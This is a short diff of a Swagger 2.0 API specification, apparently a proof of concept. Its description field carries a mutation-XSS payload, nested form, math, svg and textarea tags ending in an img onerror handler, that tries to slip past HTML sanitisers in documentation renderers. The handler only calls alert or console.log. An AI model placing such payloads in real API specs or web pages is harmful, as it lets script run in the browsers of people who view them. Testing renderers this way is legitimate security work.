@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: Faithcsde API XSS vulnerability
   description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('vulnerable') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=console.log("pwned") src=1>"></form>
   version: production
-basePath: /JSSResource/
+basePath: /docs/
 produces:
   - application/xml
   - application/json
